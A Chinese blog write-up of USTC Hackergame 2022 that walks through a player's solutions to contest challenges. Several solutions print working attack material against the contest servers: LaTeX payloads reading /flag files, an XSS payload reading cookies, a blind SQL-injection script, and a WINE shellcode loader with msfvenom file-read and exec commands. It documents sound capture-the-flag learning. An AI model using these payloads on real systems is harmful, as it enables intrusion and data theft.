---
title: USTC Hackergame 2022 Writeup
published: 2022-10-29 21:35:35
tags:
  - hackergame
  - writeup
---

TL;DR: 寄了。

<!--more-->

~~好啦认真一点~~ 第一次参加 Hackergame，然后最后还是没能进榜，大概是 119 / 2747 这个样子。

我其实第一天 web 就只剩下「二次元神经网络」了，然后还凭手速抢了个「微积分计算小练习」的一血，不过 web 就卡这了，完全没想到还能反序列化去打，毕竟 Torch 是之前是真没用过。有在打其他 CTF 比赛，不过除了 web 都不太行，太菜了（

![02b39412214b9c65f5159944debd5989.png](https://i.dawnlab.me/02b39412214b9c65f5159944debd5989.png)

## 签到

随便写，然后 `/?result=2022`。

## 猫咪问答喵

我觉得这种教你用搜索引擎的题目非常好（

1. 2017-03

> 中国科学技术大学“星云战队（Nebula）”成立于2017年3月

https://cybersec.ustc.edu.cn/2022/0826/c23847a565848/page.htm

2. Kdenlive

和官方题解不同，我没看到「Configure Kdenlive」，不过根据界面可以推断是个视频编辑工具，那就搜「KDE video editor」。

https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2022.9.20_%E8%BD%AF%E4%BB%B6%E8%87%AA%E7%94%B1%E6%97%A5/slides/gnome-wayland-user-perspective.pdf

3. 12

很好找。

4. dcd46d897adb70d63e025f175a00a89797d31a43

~~很好，我已经忘记我怎么找到这个 commit 的了~~ 可能是直接硬看 commit log + 简单过滤。

https://github.com/torvalds/linux/commit/dcd46d897adb70d63e025f175a00a89797d31a43

5. `sdf.org`

之前比较常用 [Censys](https://censys.io)，发现没索引 MD5 指纹，临时找了个 [SHODAN](https://www.shodan.io/)，直接放进去搜就能找到，Hostname 为 `*.sdf.org`，那就是 `sdf.org` 了。

https://www.shodan.io/search?query=e4:ff:65:d7:be:5d:c8:44:1d:89:6b:50:f5:50:a0:ce

6. 2003-03-01

搜索有关网络费用的内容不难找到「[关于实行新的网络费用分担办法的通知](https://ustcnet.ustc.edu.cn/2015/0127/c11104a119602/page.htm)」，可以发现应该是在「网字〔2003〕1号《关于实行新的网络费用分担办法的通知》」开始实施的，但是我实在没找到这个古董文件，于是直接猜 2003 年某月一日。

## 家目录里的秘密

### VS Code 里的 flag

直接 VS Code 打开文件夹全局搜 `flag{`。

### Rclone 里的 flag

找到 `~/.config/rclone/rclone.conf`，搜「rclone password decrypt」直接有一个在 [Go Playground](https://go.dev/play/p/IcRYDip3PnE) 里跑的代码，复制进去就完了（

## HeiLang

> 作为一个编程爱好者，我觉得实在是太酷了，很符合我对未来编程语言的想象，科技并带着趣味。

用 Regex 替换简单预处理一下数据，转换成如下格式：

```
1225 | 2381 | 2956 | 3380 | 3441 | 4073 | 4090 | 4439 | 5883 | 6253 | 7683 | 8231 | 9933 = 978
412 | 5923 | 7217 | 7289 | 7336 = 51
296 | 612 | 873 | 1232 | 1531 | 1941 | 3640 | 4449 | 4488 | 4698 | 4703 | 5225 | 5868 | 6132 | 6904 | 7812 | 8127 | 9156 | 9781 | 9917 = 807
...
```

然后写个 Python 脚本处理一下：

```python
from hashlib import sha256

a = [0] * 10000

# load from file
with open('data', 'r') as f:
    for line in f:
        line = line.replace("\n", "")
        # print(line.split(' = '))
        for pos in line.split(' = ')[0].split(' | '):
            a[int(pos)] = int(line.split(' = ')[1])

print(a)

def check(a):
    user_hash = sha256(('heilang' + ''.join(str(x)
                       for x in a)).encode()).hexdigest()
    expect_hash = 'bf678f1baf2763b7b55db57c95630c9eacbd2cabd4cc058e0fea02a4d26eb22e'
    return user_hash == expect_hash


def get_flag(a):
    if check(a):
        t = ''.join([chr(x % 255) for x in a])
        flag = sha256(t[:-16].encode()).hexdigest()[:16] + \
            '-' + sha256(t[-16:].encode()).hexdigest()[:16]
        print("Tha flag is: flag{{{}}}".format(flag))
    else:
        print("Array content is wrong, you can not get the correct flag.")

if __name__ == "__main__":
    get_flag(a)
```

![cc367c5df278f45be9fc95762f407106.png](https://i.dawnlab.me/cc367c5df278f45be9fc95762f407106.png)

~~愤怒喵（划掉~~

## Xcaptcha

直接 `requests.Session()` + BeautifulSoup 4 处理一下。

```python
import requests
from bs4 import BeautifulSoup

url = "http://202.38.93.111:10047/xcaptcha"

payload = {}
headers = {
    # some headers
}

s = requests.Session()

response = s.request("GET", url, headers=headers, data=payload)

soup = BeautifulSoup(response.text, "lxml")

body = {}

for i in soup.find_all("label"):
    print(i.text.split(" ")[0])
    body[i["for"]] = eval(i.text.split(" ")[0])

response = s.request("POST", url, data=body)

print(response.text)
```

## 旅行照片 2.0

### 照片分析

读 EXIF 即可。

### 社工入门

根据 `ZOZOMARINE STADIUM` 可以确定位置。

然后之前没找到 ADSB Exchange，买不起 Flightradar24 的会员，告辞（

## 猜数字

本来是尝试直接暴力的，一天跑个一两万没问题，但是怕被当成恶意攻击作罢（

然后 Java 的 Double 类型有 `NaN`，不可比较大小，在题目条件下会被当成正确，传入即可。

> ~~个人不喜欢 KFC 的嫩牛五方。~~

## LaTeX 机器人

### 纯文本

```latex
$$ \input{/flag1} $$
```

### 特殊字符混入

这题我也忘了从哪搜了个 `catcode` 出来... Anyhow, it works.

```latex
$$ \catcode`\_=12 \catcode`\#=12 \newread\file \openin\file=/flag2 \loop\unless\ifeof\file \read\file to\fileline \fileline \repeat \closein\file $$
```

## Flag 的痕迹

[splitbrain/dokuwiki#3421](https://github.com/splitbrain/dokuwiki/issues/3421) 有提到 `do=diff`，试了下没禁用。

## 安全的在线测评

### 无法 AC 的题目

静态数据因为权限问题可以直接读。

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>

// copied from random stackoverflow answer
// sorry I can't find the link now
char *trimwhitespace(char *str)
{
    char *end;

    // Trim leading space
    while (isspace((unsigned char)*str))
        str++;

    if (*str == 0) // All spaces?
        return str;

    // Trim trailing space
    end = str + strlen(str) - 1;
    while (end > str && isspace((unsigned char)*end))
        end--;

    // Write new null terminator character
    end[1] = '\0';

    return str;
}

int main() {

    FILE *fp;
    char *line = NULL;
    size_t len = 0;
    ssize_t read;

    fp = fopen("./data/static.out", "r");
    if (fp == NULL)
        exit(1);

    while ((read = getline(&line, &len, fp)) != -1)
    {
        if (len > 0)
            printf("%s\n", trimwhitespace(line));
    }

    fclose(fp);
    if (line)
        free(line);

    return 0;
}
```

### 动态数据

想到了在编译时带数据，但是真的没找到方法...

## 线路板

用 KiCad 的 Gerber 查看器打开，不过不知道为什么我没把 flag 点出来，导出到编辑器后能看到（

## Flag 自动机

虽然没做出来，但是我成功通过另一个程序发 Signal 点了那个按钮，然而（

## 微积分计算小练习

简单的 XSS 注入，不出网，随便试几下可以发现他返回的结果应该是获取指定 id 的元素内容，然后尝试读一下 cookie：

```html
100:<img src=x onerror="document.getElementById('greeting').innerText=document.cookie;">
```

## 杯窗鹅影

完全不会二进制，搜了一下找到了 [Attacking applications running under WINE](https://schlafwandler.github.io/posts/attacking-wine-part-i/)，给了一个执行 Linux Shellcode 的示例：

```c
#include <windows.h>
#include <stdio.h>

// i686-w64-mingw32-gcc -o exec_shellcode.exe exec_shellcode.c

unsigned char win32_messagebox[] = {
  0x55, 0x8b, 0xec, 0x83, 0xec, 0x74, 0x64, 0xa1, 0x30, 0x00, 0x00, 0x00,
  0x53, 0x8b, 0x40, 0x0c, 0xc7, 0x45, 0xc4, 0x2a, 0x2c, 0x00, 0x00, 0x8b,
  0x40, 0x0c, 0xc7, 0x45, 0xc8, 0x50, 0x2a, 0x00, 0x00, 0x8b, 0x00, 0xc7,
  0x45, 0xcc, 0xa4, 0xf1, 0x00, 0x00, 0x8b, 0x00, 0x8b, 0x48, 0x18, 0x8b,
  0x41, 0x3c, 0x8b, 0x44, 0x08, 0x78, 0x03, 0xc1, 0x8b, 0x58, 0x20, 0x8b,
  0x50, 0x18, 0x03, 0xd9, 0x89, 0x55, 0xfc, 0x85, 0xd2, 0x74, 0x5e, 0x8b,
  0x50, 0x1c, 0x56, 0x8b, 0x70, 0x24, 0x57, 0x89, 0x55, 0xf4, 0x03, 0xf1,
  0x0f, 0xb7, 0x06, 0x8b, 0x3b, 0x8d, 0x04, 0x82, 0x03, 0xf9, 0x8b, 0x04,
  0x08, 0x03, 0xc1, 0x8d, 0x5b, 0x04, 0x89, 0x45, 0xf8, 0x33, 0xd2, 0xeb,
  0x0d, 0x6b, 0xd2, 0x1f, 0x0f, 0xb6, 0xc0, 0x66, 0x33, 0xd0, 0x0f, 0xb7,
  0xd2, 0x47, 0x8a, 0x07, 0x84, 0xc0, 0x75, 0xed, 0x0f, 0xb7, 0xfa, 0x8b,
  0x55, 0xf8, 0x33, 0xc0, 0x39, 0x7c, 0x85, 0xc4, 0x75, 0x04, 0x89, 0x54,
  0x85, 0xc4, 0x40, 0x83, 0xf8, 0x03, 0x7c, 0xf0, 0x8b, 0x55, 0xf4, 0x83,
  0xc6, 0x02, 0xff, 0x4d, 0xfc, 0x75, 0xb1, 0x5f, 0x5e, 0x8d, 0x45, 0xe8,
  0x33, 0xdb, 0x50, 0xc7, 0x45, 0xe8, 0x55, 0x73, 0x65, 0x72, 0xc7, 0x45,
  0xec, 0x33, 0x32, 0x2e, 0x64, 0x66, 0xc7, 0x45, 0xf0, 0x6c, 0x6c, 0x88,
  0x5d, 0xf2, 0xff, 0x55, 0xc4, 0x8d, 0x4d, 0xd0, 0x51, 0x50, 0xc7, 0x45,
  0xd0, 0x4d, 0x65, 0x73, 0x73, 0xc7, 0x45, 0xd4, 0x61, 0x67, 0x65, 0x42,
  0xc7, 0x45, 0xd8, 0x6f, 0x78, 0x41, 0x00, 0xff, 0x55, 0xc8, 0x53, 0x8d,
  0x4d, 0xdc, 0x51, 0x8d, 0x4d, 0x8c, 0x51, 0x53, 0xc7, 0x45, 0x8c, 0x54,
  0x68, 0x69, 0x73, 0xc7, 0x45, 0x90, 0x20, 0x4d, 0x65, 0x73, 0xc7, 0x45,
  0x94, 0x73, 0x61, 0x67, 0x65, 0xc7, 0x45, 0x98, 0x42, 0x6f, 0x78, 0x20,
  0xc7, 0x45, 0x9c, 0x77, 0x61, 0x73, 0x20, 0xc7, 0x45, 0xa0, 0x63, 0x72,
  0x65, 0x61, 0xc7, 0x45, 0xa4, 0x74, 0x65, 0x64, 0x20, 0xc7, 0x45, 0xa8,
  0x75, 0x73, 0x69, 0x6e, 0xc7, 0x45, 0xac, 0x67, 0x20, 0x61, 0x20, 0xc7,
  0x45, 0xb0, 0x77, 0x69, 0x6e, 0x64, 0xc7, 0x45, 0xb4, 0x6f, 0x77, 0x73,
  0x20, 0xc7, 0x45, 0xb8, 0x73, 0x68, 0x65, 0x6c, 0xc7, 0x45, 0xbc, 0x6c,
  0x63, 0x6f, 0x64, 0x66, 0xc7, 0x45, 0xc0, 0x65, 0x2e, 0x88, 0x5d, 0xc2,
  0xc7, 0x45, 0xdc, 0x4d, 0x65, 0x73, 0x73, 0xc7, 0x45, 0xe0, 0x61, 0x67,
  0x65, 0x42, 0x66, 0xc7, 0x45, 0xe4, 0x6f, 0x78, 0x88, 0x5d, 0xe6, 0xff,
  0xd0, 0x5b, 0xc9, 0xc3
};

unsigned char linux32_printline[] = {
  0x31, 0xc0, 0x31, 0xdb, 0x31, 0xd2, 0xb0, 0x04, 0xb3, 0x02, 0xeb, 0x06,
  0x59, 0xb2, 0x2f, 0xcd, 0x80, 0xc3, 0xe8, 0xf5, 0xff, 0xff, 0xff, 0x54,
  0x68, 0x69, 0x73, 0x20, 0x6c, 0x69, 0x6e, 0x65, 0x20, 0x77, 0x61, 0x73,
  0x20, 0x70, 0x72, 0x69, 0x6e, 0x74, 0x65, 0x64, 0x20, 0x75, 0x73, 0x69,
  0x6e, 0x67, 0x20, 0x61, 0x73, 0x20, 0x6c, 0x69, 0x6e, 0x75, 0x78, 0x20,
  0x73, 0x68, 0x65, 0x6c, 0x6c, 0x63, 0x6f, 0x64, 0x65, 0x0a
};

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    LPVOID exec_buffer = VirtualAlloc(NULL,sizeof(win32_messagebox),MEM_COMMIT,PAGE_EXECUTE_READWRITE);
    void (*pcode)() = (void(*)())exec_buffer;

    memcpy(exec_buffer,linux32_printline,sizeof(linux32_printline));
    pcode();

    memcpy(exec_buffer,win32_messagebox,sizeof(win32_messagebox));
    pcode();

    return 0;
}
```

于是直接用 `msfvenom` 生成两个：

```
# /opt/metasploit-framework/bin/msfconsole

msfvenom -p linux/x86/read_file -f c PATH=/flag1
msfvenom -p linux/x64/exec -f c CMD=/readflag
```

## 蒙特卡罗轮盘赌

利用前两次的错误机会暴力去找使用的随机数种子：

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

double rand01()
{
	return (double)rand() / RAND_MAX;
}

int main()
{
	// disable buffering
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	unsigned start = (unsigned)time(0);
	unsigned end = (unsigned)time(0) + 2 * clock();

	printf("%d\n", start);
	printf("%d\n", end);

	freopen("/data/result", "w", stdout);

	for (unsigned k = start; k < end; k++) {
		if (k % 1000 == 0) fprintf(stderr, "%d\n", k);
		srand(k);
		int games = 5;
		int win = 0;
		int lose = 0;
		char target[20];
		char guess[2000];
		for (int i = 0, limit = 1; i < limit; i++) {
			int M = 0;
			int N = 400000;
			for (int j = 0; j < N; j++) {
				double x = rand01();
				double y = rand01();
				if (x*x + y*y < 1) M++;
			}
			double pi = (double)M / N * 4;
			sprintf(target, "%1.5f", pi);
			if (i > 1) printf("%1.5f\n", pi);
            // first
			if (i == 0 && strcmp(target, "3.14425") == 0)
				limit = 2;
            // second
			if (i == 1 && strcmp(target, "3.14019") == 0)
				limit = 5;
			if (i == 4) return 0;
		}
	}

	return 0;
}
```

## 你先别急

尝试几次会发现验证码的复杂度会根据 `username` 确定，并且未找到的情况下是最复杂的，然后就人肉 sqlmap 盲注了（

```python
import requests
import base64
import os

url = "http://202.38.93.111:11230/captcha"

# payload={
#     "username": "Simple-1' and (select tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 1) like 'flag%' and '1'='1"
# }

chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_"
current_str = ""

os.system("rm bf/*")

for i in chars:
    payload={
        "username": "Simple-1' and (select flag from flag limit 1 offset 0) like 'flag{" + current_str + i + "%}' and '1'='1"
    }

    # payload={
    #     "username": "Simple-1' and substr((select flag from flag limit 1 offset 0), 0, 20) = 'flag{JiJi203e981dfa' and '1'='1"
    # }

    # payload={
    #     "username": "Simple-1' and unicode(substr((select flag from flag limit 1 offset 0), 8, 1)) =74 and '1'='1"
    # }

    files=[

    ]
    headers = {
      # some headers
    }

    response = requests.request("POST", url, headers=headers, data=payload, files=files)

    print(response.json())

    f = open("bf/" + current_str + i + ".png", "wb")
    f.write(base64.b64decode(response.json()["result"]))
    f.close()

    quit()
```

人肉确定 flag 的下一个字符，还好也不是很长。

## 片上系统

### 引导扇区

PulseView 导入后设定一下 Decoder，穷举一下看起来比较正确的 channel 设定，然后把 data 处理一下：

```python
data = [55, 1, 16, 32, 19, 1, 193, 255, 239, 0, 0, 1, 55, 21, 0, 32, 103, 0, 5, 0, 111, 0, 64, 0, 183, 7, 0, 32, 131, 168, 135, 11, 183, 7, 0, 32, 131, 165, 71, 10, 183, 7, 0, 32, 3, 175, 71, 11, 183, 7, 0, 32, 131, 174, 7, 11, 183, 7, 0, 32, 3, 168, 199, 9, 19, 5, 16, 0, 19, 134, 8, 32, 19, 14, 16, 0, 19, 3, 112, 0, 131, 167, 5, 0, 227, 142, 7, 254, 35, 32, 175, 0, 35, 160, 206, 1, 131, 167, 5, 0, 227, 142, 7, 254, 147, 135, 8, 0, 19, 7, 8, 0, 131, 166, 7, 0, 19, 7, 71, 0, 147, 135, 71, 0, 35, 46, 215, 254, 227, 152, 199, 254, 19, 5, 21, 0, 19, 8, 8, 32, 227, 18, 101, 252, 183, 18, 0, 32, 103, 128, 2, 0, 103, 128, 0, 0, 0, 16, 0, 32, 20, 32, 0, 150, 16, 32, 0, 150, 0, 32, 0, 150, 8, 16, 0, 150, 4, 16, 0, 150, 0, 16, 0, 150, 0, 0, 0, 150, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 102, 108, 97, 103, 123, 48, 75, 95, 121, 111, 117, 95, 103, 111, 84, 95, 116, 104, 51, 95, 98, 52, 115, 73, 99, 95, 49, 100, 69, 52, 95, 99, 97, 82, 82, 121, 95, 48, 78, 125]

for i in range(len(data)):
    print(chr(data[i]), end='')
```

## 企鹅拼盘

### 这么简单我闭眼都可以！

穷举（

----

Hackergame 的题整体上是比较有趣的，也会尝试一般 CTF 比赛不太可能涉及的题型。

题目质量很高，覆盖的知识点很广。体验不错，明年还会来陪跑（